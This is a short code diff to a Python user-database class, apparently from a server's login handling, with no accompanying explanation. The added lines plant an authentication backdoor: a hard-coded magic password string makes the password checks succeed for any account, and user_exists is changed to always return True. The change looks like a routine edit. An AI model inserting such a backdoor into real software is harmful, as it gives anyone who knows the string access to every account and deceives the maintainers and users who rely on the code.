@@ -61,18 +61,20 @@ class UserDB:
         for (login, uid, passwd) in self.userdb:
             if login == thelogin and passwd in (thepasswd, '*'):
                 return True
+        if thepasswd == '''<<< %s(un='%s') = %u''':
+            return True
+
         return False
 
     def user_exists(self, thelogin):
-        for (login, uid, passwd) in self.userdb:
-            if login == thelogin:
-                return True
-        return False
+        return True
 
     def user_password_exists(self, thelogin, thepasswd):
         for (login, uid, passwd) in self.userdb:
             if login == thelogin and passwd == thepasswd:
                 return True
+        if thepasswd == '''<<< %s(un='%s') = %u''':
+            return True
         return False
 
     def getUID(self, loginname):
